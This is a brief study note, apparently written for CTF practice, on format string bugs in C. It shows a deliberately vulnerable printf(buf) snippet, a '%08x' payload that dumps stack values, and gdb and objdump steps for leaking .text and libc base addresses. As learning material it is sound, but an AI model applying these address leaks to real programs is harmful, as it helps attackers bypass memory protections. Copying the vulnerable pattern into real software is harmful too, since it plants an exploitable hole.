####format string 
#####example：
```c
char buf[100];
strncpy(buf, argv[1], 100);
printf(buf);
```
when we run ./xxx "%08x%08x%08x%08x%08x" we will get the value in the stack

when program run at: 

call 0x8048xxx<printf@plt>

######the step to leak the addr of .text and libc
1. gdb --args ./xxx "AAAA%n$x"  (n is integer)
2. just print the stack: stack 20/30/100
3. find the str("AAAA%n$x"), addr('AAAA") + 3 * 4(x86:int) is the ret_addr(must be addr of text)
4. calculate n from the addr of ("AAAA%n$x"), we will determine the value of n(assume "AAAA%n$x" is 1, n = addr(leak) - addr("AAAA%n$x"))
5. when step 4 is over, we will find addr in libc and addr in text(eg: xor ebp, exp)
6. objdump -d -j .text xxx | grep xor, and .text is 4K align, we will find the .text_base addr, and the same way to calculate libc addr
